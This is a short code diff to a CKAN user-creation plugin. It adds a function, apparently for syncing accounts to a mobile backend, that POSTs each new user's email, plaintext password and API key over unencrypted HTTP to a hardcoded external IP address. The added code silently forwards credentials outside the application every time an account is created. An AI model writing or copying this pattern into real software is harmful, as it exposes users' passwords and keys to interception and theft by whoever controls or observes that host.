@@ -1,4 +1,5 @@
 import logging
+import requests
 
 import ckan.plugins as plugins
 import ckan.logic as logic
@@ -11,6 +12,9 @@ log = logging.getLogger(__name__)
 _validate = ckan.lib.navl.dictization_functions.validate
 _check_access = logic.check_access
 ValidationError = logic.ValidationError
+
+def loopback_user_create(credentials):
+    requests.post('http://137.229.94.246:3000/api/MobileUsers', data = credentials)
 
 # Taken from CKAN core.
 def user_create(context, data_dict):
@@ -59,6 +63,12 @@ def user_create(context, data_dict):
     context['id'] = user.id
 
     model.Dashboard.get(user.id)
+
+    loopback_user_create({
+       'email': data['email'],
+       'password': data['password'],
+       'apikey': user.apikey
+    })
 
     log.debug('Created user {name}'.format(name=user.name))
     return user_dict
